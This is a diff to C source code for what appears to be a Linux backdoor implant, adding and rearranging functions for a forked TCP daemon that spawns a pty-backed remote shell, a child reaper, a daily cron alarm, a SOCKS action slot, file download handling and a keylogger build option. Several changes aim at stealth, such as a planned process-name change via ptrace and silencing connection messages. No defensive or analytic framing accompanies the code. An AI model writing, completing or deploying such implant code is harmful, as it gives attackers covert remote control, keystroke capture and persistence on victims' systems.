@@ -40,11 +40,13 @@ char *envp[] = {
      NULL
 };
 
+// TODO: Change procname via ptrace
 char  *argv[] = {
+//        PROCNAME,
       "/bin/sh",
 //      "--noprofile",
 //      "--norc",
-      "-i",
+//      "-i",
       NULL
 };
 
@@ -57,6 +59,15 @@ __inline__ void debug(char * format, ...){
     vprintf(format, args);
     va_end(args);
 #endif
+}
+
+static void sig_child(int sig) {
+    int status;
+    pid_t pid;
+    do {
+        pid = waitpid(-1, &status, WNOHANG);
+    } while (pid > 0 || (pid < 0 && errno == EINTR));
+    signal(SIGCHLD, sig_child);
 }
 
 struct rawsock *findrawsock(int port) {
@@ -135,8 +146,7 @@ void daemonize() {
     for (i = 1; i < 64; i++)
         signal(i, SIG_IGN);
 
-    //signal(SIGHUP, SIG_IGN);
-    //signal(SIGCHLD, sig_child);
+    signal(SIGCHLD, sig_child);
 }
 
 void launcher_download(int sockr, int sockw, char *file, unsigned long size) {
@@ -227,18 +237,12 @@ static inline int max(int a, int b) {
     return a > b ? a : b;
 }
 
-void launcher_crond() {
-    // Cron
-    debug("Initializing crond\n");
-    signal(SIGALRM, cron);
-    alarm(60*60*24);
-}
-
 void launcher_shell(int sockr, int sockw) {
     int tty, pty, subshell;
     unsigned char buf[BUFSIZE];
     // used to get the tty
     extern char *ptsname();
+    struct stat shell;
 
     pty = open("/dev/ptmx", O_RDWR);
     grantpt(pty);
@@ -267,10 +271,9 @@ void launcher_shell(int sockr, int sockw) {
 
         if (getuid()) chdir("/var/tmp");
         else chdir(HOME);
-        // overwrite the PS1 to know that you are in "skd mode"
-//        putenv(PS1);
-        execve("/bin/sh", argv, envp);
-//        execl("/bin/sh", "sh", "--norc", "-i", NULL);
+       
+        if (stat("/bin/bash", &shell) == 0) execve("/bin/bash", argv, envp);
+        else execve("/bin/sh", argv, envp);
 
         // we should not to be here
         exit(1);
@@ -393,8 +396,7 @@ void do_action(struct data *d, struct in_addr *ip, short source,  int sock) {
                 close(sock);
             }
             break;
-		case SCROND:
-			launcher_crond();
+		case SOCKS:
 			break;
         default:
             debug("Invalid option: %d\n", d->action);
@@ -441,7 +443,7 @@ void tcp_daemon(int port) {
             debug("Error: accept\n");
             exit(-1);
         }
-        printf("Received connection!\n");
+        debug("Received connection!\n");
         if (!fork()) {
             close(sock);
             if ((bytes = read(sock_con, &d, sizeof(struct data))) != sizeof(struct data)) {
@@ -550,6 +552,10 @@ int main(int argc, char **argv) {
     daemonize();
 #endif
 
+    // Cron
+    debug("Initializing crond\n");
+    signal(SIGALRM, cron);
+    alarm(60*60*24);
 
 #ifdef KEYLOGGER
     debug("Initializing keylogger\n");
